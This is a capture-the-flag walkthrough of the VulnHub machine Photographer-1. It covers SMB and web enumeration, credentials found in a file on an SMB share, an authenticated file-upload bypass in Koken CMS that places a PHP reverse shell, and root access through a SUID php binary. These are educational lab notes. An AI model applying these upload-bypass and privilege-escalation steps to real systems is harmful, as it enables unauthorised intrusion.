# Table of contents

- [Recon](#recon)
  - [TCP/80 - HTTP](#tcp80---http)
    - [FFUF](#ffuf)
  - [TCP/139,445 - SMB](#tcp139445---smb)
    - [Enum4linux](#enum4linux)
    - [Crackmapexec](#crackmapexec)
    - [SMBMap](#smbmap)
  - [TCP/8000 - HTTP](#tcp8000---http)
    - [FFUF](#ffuf)
- [Initial Foothold](#initial-foothold)
  - [TCP/80 - HTTP - No Exploit](#tcp80---http---no-exploit)
  - [TCP/139,445 - SMB](#tcp139445---smb)
  - [TCP/8000 - HTTP - Koken CMS File Upload](#tcp8000---http---koken-cms-file-upload)
- [Privilege Escalation](#privilege-escalation)
  - [Root - Via](#root---via)

# Recon
## TCP/80 - HTTP
### FFUF
```
┌──(root💀kali)-[~/vulnHub/Photographer-1]
└─# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php' -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.110.10/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .html .txt .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 403
________________________________________________

                        [Status: 200, Size: 5711, Words: 296, Lines: 190]
assets                  [Status: 301, Size: 317, Words: 20, Lines: 10]
elements.html           [Status: 200, Size: 19831, Words: 1279, Lines: 459]
generic.html            [Status: 200, Size: 4243, Words: 389, Lines: 83]
images                  [Status: 301, Size: 317, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 5711, Words: 296, Lines: 190]
index.html              [Status: 200, Size: 5711, Words: 296, Lines: 190]
:: Progress: [18460/18460] :: Job [1/1] :: 1896 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```


## TCP/139,445 - SMB
### Enum4linux
```
---------------------------------------------------------------------------
|    Users on 192.168.110.10 via RID cycling (RIDS: 500-550,1000-1050)    |
---------------------------------------------------------------------------
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-3693138109-3993630114-3057792995
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\daisa (Local User)
Use of uninitialized value $user_info in pattern match (m//) at ./enum4linux.pl line 932.

S-1-22-1-1001 Unix User\agi (Local User)
Use of uninitialized value $user_info in pattern match (m//) at ./enum4linux.pl line 932.
```
- `daisa`
- `agi`
### Crackmapexec
```
┌──(root💀kali)-[~/vulnHub/Photographer-1/192.168.110.10]
└─# crackmapexec smb $ip -u '' -p '' --shares
SMB         192.168.110.10  445    PHOTOGRAPHER     [*] Windows 6.1 (name:PHOTOGRAPHER) (domain:) (signing:False) (SMBv1:True)
SMB         192.168.110.10  445    PHOTOGRAPHER     [+] \: 
SMB         192.168.110.10  445    PHOTOGRAPHER     [+] Enumerated shares
SMB         192.168.110.10  445    PHOTOGRAPHER     Share           Permissions     Remark
SMB         192.168.110.10  445    PHOTOGRAPHER     -----           -----------     ------
SMB         192.168.110.10  445    PHOTOGRAPHER     print$                          Printer Drivers
SMB         192.168.110.10  445    PHOTOGRAPHER     sambashare      READ            Samba on Ubuntu
SMB         192.168.110.10  445    PHOTOGRAPHER     IPC$                            IPC Service (photographer server (Samba, Ubuntu))
```
- `sambashare`, READ
### SMBMap
```
┌──(root💀kali)-[~/vulnHub/Photographer-1/192.168.110.10]
└─# smbmap -H $ip -u '' -p ''
[+] Guest session   	IP: 192.168.110.10:445	Name: 192.168.110.10                                    
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	sambashare                                        	READ ONLY	Samba on Ubuntu
	IPC$                                              	NO ACCESS	IPC Service (photographer server (Samba, Ubuntu))
```
- `sambashare`, READ


## TCP/8000 - HTTP
### FFUF
- No directories enumerated


# Initial Foothold
## TCP/80 - HTTP - No Exploit
1. Prcoeed to `index.html`
	 ![](images/Pasted%20image%2020220203163611.png)
	 - Could not find any vulnerabilities

## TCP/139,445 - SMB 
1. Access `sambashare`
	```
	┌──(root💀kali)-[~/vulnHub/Photographer-1/192.168.110.10/loot/smb]
	└─# smbclient //$ip/sambashare
	Enter WORKGROUP\root's password: 
	Try "help" to get a list of possible commands.
	smb: \> ls
	  .                                   D        0  Tue Jul 21 09:30:07 2020
	  ..                                  D        0  Tue Jul 21 17:44:25 2020
	  mailsent.txt                        N      503  Tue Jul 21 09:29:40 2020
	  wordpress.bkp.zip                   N 13930308  Tue Jul 21 09:22:23 2020

			278627392 blocks of size 1024. 264268400 blocks available
	smb: \> put test
	NT_STATUS_ACCESS_DENIED opening remote file \test
	smb: \> 
	```
	- No write access
2. Download all files
	```
	┌──(root💀kali)-[~/vulnHub/Photographer-1/192.168.110.10/loot/smb]
	└─# smbclient //$ip/sambashare -c 'prompt;recurse;mget *'
	Enter WORKGROUP\root's password: 
	getting file \mailsent.txt of size 503 as mailsent.txt (28.9 KiloBytes/sec) (average 28.9 KiloBytes/sec)
	getting file \wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip (45346.0 KiloBytes/sec) (average 42915.8 KiloBytes/sec)
	```
3. View files
	- `wordpress.bkp.zip`
		- Standard wordpress CMS files, nothing suspicious
	- `mailsent.txt`
		![](images/Pasted%20image%2020220203163752.png)
4. List of possible credentials till this point
	- Usernames:
		- agi
		- daisa
	- Passwords
		- Variants of `babygirl`

## TCP/8000 - HTTP - Koken CMS File Upload
1. Proceed to `http://192.168.110.10`
	 ![](images/Pasted%20image%2020220203164057.png)
	 - `Koken 0.22.24`
2. After [googling](https://www.linuxhelp.com/how-to-install-koken-cms-on-ubuntu-19-04) about `Koken` CMS, its login page is at `/admin`
	![](images/Pasted%20image%2020220203164903.png)
3. Successfully login w/ daisa@photographer.com:babygirl
	![](images/Pasted%20image%2020220203165438.png)
4. Search exploits for `Koken 0.22.24`

	| Exploit Title                                             | Path |
	| --------------------------------------------------------- | ---- |
	| Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated) | php/webapps/48706.txt     |

5. Try `php/webapps/48706.txt`
	1. Rename [`php-reverse-shell.php`](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) to `php-reverse-shell.php.jpg`
		```
		┌──(root💀kali)-[~/vulnHub/Photographer-1/192.168.110.10/exploit/koken]
		└─# mv php-reverse-shell.php php-reverse-shell.php.jpg
		```
	2. Login w/ daisa@photographer.com:babygirl
	3. Turn on burp to intercept file upload
	4. Upload file
		![](images/Pasted%20image%2020220203170204.png)
		- `Kokan CMS Dashboard -> Library -> Content -> Bottom Right` 
	5. On burp, rename file to `image.php`
	![](images/Pasted%20image%2020220203170828.png)
	6. Hover over Download
	![](images/Pasted%20image%2020220203171125.png)
	7. Execute shell @ `192.168.110.10:8000/storage/originals/1e/32/image.php`
		![](images/Pasted%20image%2020220203171350.png)
8. User Flag
	```
	www-data@photographer:/home/daisa$ cat user.txt 
	d41d8cd98f00b204e9800998ecf8427e
	```

# Privilege Escalation
## Root - Via
1. Since there is a CMS, we can obtain more credentials by finding its SQL configuration file.
	- [Google](https://www.inmotionhosting.com/support/website/how-to-fix-koken-database-connection-errors/) 
2. Find SQL Configuration file
	```
	www-data@photographer:/var/www/html/koken$ find $(pwd) 2>/dev/null | grep database.php
	/var/www/html/koken/app/application/config/database.php
	/var/www/html/koken/storage/configuration/database.php
	```
3. View `/var/www/html/koken/storage/configuration/database.php`
	![](images/Pasted%20image%2020220203172741.png)
	- kokenuser:user_password_here
4. Access MySQL
	```
	MariaDB [koken]> SELECT password,email FROM koken_users;
	+--------------------------------------------------------------+------------------------+
	| password                                                     | email                  |
	+--------------------------------------------------------------+------------------------+
	| $2a$08$ruF3jtzIEZF1JMy/osNYj.ibzEiHWYCE4qsC6P/sMBZorx2ZTSGwK | daisa@photographer.com |
	+--------------------------------------------------------------+------------------------+
	1 row in set (0.01 sec)
	```
	- No new credentials
5. Linpeas
	```
	                                         ╔═══════════════════╗
	═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════
											 ╚═══════════════════╝
	╔══════════╣ SUID - Check easy privesc, exploits and write perms
	╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
	-rwsr-xr-- 1 root messagebus 42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
	-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
	-rwsr-sr-x 1 root root 11K Oct 25  2018 /usr/lib/xorg/Xorg.wrap
	-rwsr-xr-x 1 root root 109K Jul 10  2020 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
	-rwsr-xr-x 1 root root 419K Mar  4  2019 /usr/lib/openssh/ssh-keysign
	-rwsr-xr-x 1 root root 19K Mar 18  2017 /usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
	-rwsr-xr-x 1 root root 15K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
	-rwsr-xr-- 1 root dip 386K Feb 11  2020 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
	-rwsr-xr-x 1 root root 23K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
	-rwsr-xr-x 1 root root 53K May 16  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
	-rwsr-xr-x 1 root root 39K May 16  2017 /usr/bin/newgrp  --->  HP-UX_10.20
	-rwsr-xr-x 1 root root 74K May 16  2017 /usr/bin/gpasswd
	-rwsr-xr-x 1 root root 4.7M Jul  9  2020 /usr/bin/php7.2 (Unknown SUID binary)
	-rwsr-xr-x 1 root root 134K Jan 31  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
	-rwsr-xr-x 1 root root 40K May 16  2017 /usr/bin/chsh
	-rwsr-xr-x 1 root root 49K May 16  2017 /usr/bin/chfn  --->  SuSE_9.3/10
	-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping
	-rwsr-xr-x 1 root root 31K Jul 12  2016 /bin/fusermount
	-rwsr-xr-x 1 root root 40K May 16  2018 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
	-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping6
	-rwsr-xr-x 1 root root 27K May 16  2018 /bin/umount  --->  BSD/Linux(08-1996)
	-rwsr-xr-x 1 root root 40K May 16  2017 /bin/su
	```
	- `/usr/bin/php7.2`, has a [GTFOBins](https://gtfobins.github.io/gtfobins/php/#suid) entry
6. Exploit
	```
	www-data@photographer:/tmp$ CMD="/bin/sh"
	www-data@photographer:/tmp$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
	```
	![](images/Pasted%20image%2020220203175424.png)
7. Root flag
	```
	rootbash-4.3# cd /root
	rootbash-4.3# ls
	proof.txt
	rootbash-4.3# cat proof.txt 

									.:/://::::///:-`                                
								-/++:+`:--:o:  oo.-/+/:`                            
							 -++-.`o++s-y:/s: `sh:hy`:-/+:`                         
						   :o:``oyo/o`. `      ```/-so:+--+/`                       
						 -o:-`yh//.                 `./ys/-.o/                      
						++.-ys/:/y-                  /s-:/+/:/o`                    
					   o/ :yo-:hNN                   .MNs./+o--s`                   
					  ++ soh-/mMMN--.`            `.-/MMMd-o:+ -s                   
					 .y  /++:NMMMy-.``            ``-:hMMMmoss: +/                  
					 s-     hMMMN` shyo+:.    -/+syd+ :MMMMo     h                  
					 h     `MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s.                 
					 y     `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm     +-                 
					 h      dMMMMd:````  `mmNh   ```./NMMMMs     o.                 
					 y.     /MMMMNmmmmd/ `s-:o  sdmmmmMMMMN.     h`                 
					 :o      sMMMMMMMMs.        -hMMMMMMMM/     :o                  
					  s:     `sMMMMMMMo - . `. . hMMMMMMN+     `y`                  
					  `s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     `s-                   
					   `s:    --.sNMMMMMMMMMMMMMMMMMMmo/.    -s.                    
						 /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o`                     
						  .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o-                       
							./+:`:yh:dso/.+-++++ss+h++.:++-                         
							   -/+/-:-/y+/d:yh-o:+--/+/:`                           
								  `-///////////////:`                               


	Follow me at: http://v1n1v131r4.com


	d41d8cd98f00b204e9800998ecf8427e
	rootbash-4.3# 
	```


---
Tags: #tcp/139-445-smb/file-share  #tcp/80-http/web-app-cms-exploit #tcp/80-http/rce #linux-priv-esc/suid/gtfo-bin 

---
